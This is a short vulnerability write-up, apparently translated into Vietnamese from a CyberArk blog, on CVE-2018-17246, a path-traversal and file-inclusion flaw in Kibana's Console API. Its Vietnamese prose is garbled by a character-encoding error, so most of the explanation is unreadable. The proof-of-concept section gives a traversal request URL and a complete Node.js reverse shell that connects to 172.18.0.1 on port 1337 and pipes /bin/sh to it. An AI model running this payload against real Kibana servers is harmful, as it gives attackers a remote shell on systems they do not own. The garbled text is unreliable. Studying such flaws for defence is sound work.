# CVE-2018-17246

---

(Translated from [cyberank.com](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/))

---

## Analysis vulnerability

- Lá»— há»ng xuáº¥t phÃ¡t tá»« : 

![img](assets/kibana_server.png)

****

- API nÃ y sáº½ require cÃ¡c thÆ° viá»‡n mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm tra dá»¯ liá»‡u Ä‘áº§u vÃ o theo params `apis`

![img](assets/serverjs.png)

- Tá»« Ä‘Ã¢y cÃ³ thá»ƒ khai thÃ¡c lá»—i `Path Travelsal`

![img](assets/logged_error.png)

- Tuy nhiÃªn á»Ÿ Ä‘Ã¢y vÃ¬ lÃ­ do á»Ÿ method `api.asJSON` sáº½ khÃ´ng tráº£ vá» json náº¿u khÃ´ng Ä‘á»c Ä‘Æ°á»£c object chÃºng ta truyá»n vÃ o (lÃ­ do xáº£y ra error á»Ÿ hÃ¬nh trÃªn) .  á»ž Ä‘Ã¢y hÃ´ng láº½ lÃ  `path traversal` blind â‰ðŸ¦†

![img](assets/api_js.png)

- Äá»ƒ nÃ¢ng cáº¥p thÃªm lá»—i nÃ y pháº£i phÃ¢n tÃ­ch thÃªm hÃ m `require` cá»§a nodejs

  - Vá» cÆ¡ báº£n nÃ³ khÃ¡ giá»‘ng hÃ m `include` cá»§a `php`

  - `Module Require`:

    - ÄÃ¢y lÃ  1 core module cá»§a nodejs do Ä‘Ã³ chá»‰ cáº§n gá»i lÃªn vÃ  ko cáº§n khai bÃ¡o : `require('require')` 
    - Khi node gá»i Ä‘áº¿n require : 
      1. NÃ³ sáº½ tÃ¬m Ä‘áº¿n Ä‘Æ°á»ng dáº«n cá»§a file import
      2. Sau Ä‘Ã³ nÃ³ sáº½ xÃ¡c Ä‘á»‹nh file type cá»§a file import
      3. Chuyá»ƒn dá»¯ liá»‡u vÃ o biáº¿n require
      4. Thá»±c thi dá»¯ liá»‡u vá»›i code Ä‘Ã£ load
      5. NÃ³ sáº½ khÃ´ng load láº¡i code khi gá»i Ä‘áº¿n biáº¿n truyá»n vÃ o 

    (táº¡m thá»i mÃ¬nh chá»‰ má»›i hiá»ƒu tá»›i Ä‘Ã¢y)

- TÃ³m gá»n : Module `require` sáº½ thá»±c thi vÃ  tráº£ vá» object mÃ  module nÃ y export ra. Váº­y tá»« Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ kiáº¿m 1 module nÃ o thá»±c hiá»‡n nhá»¯ng process Ä‘á»ƒ nÃ¢ng impact . (cÃ³ thá»ƒ táº¯t service , RCE....)

- Má»™t sá»‘ module :

> **docs_repo.js**

![img](assets/docs_cli.png)

> **cli_plugin/cli.js**

![img](assets/cli_plugin_clijs.png)

- á»ž Ä‘Ã¢y cÃ³ thá»ƒ nÃ¢ng cáº¥p lÃªn RCE nhÆ°ng cáº§n pháº£i cÃ³ 1 file call backconnect trÃªn server

---

## PoC RCE

1. Báº±ng cÃ¡ch kÃ¬ diá»‡u nÃ o Ä‘Ã³ cÃ³ 1 file js trÃªn server
2. Call Ä‘áº¿n api ``/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js``

> **Node Revershell**

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "172.18.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

